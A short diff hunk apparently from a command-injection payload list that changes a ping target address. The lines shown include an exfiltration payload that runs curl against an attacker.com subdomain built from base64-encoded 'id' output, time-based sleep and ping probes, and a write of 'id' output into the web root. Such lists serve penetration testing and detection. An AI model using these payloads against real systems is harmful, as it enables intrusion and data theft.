@@ -91,7 +91,7 @@ curl http://$(id | base64).attacker.com
 
 # Time-based
 sleep 5
-ping -c 5 127.0.0.1
+ping -c 5 192.168.1.14
 
 # File write
 id > /var/www/html/proof.txt
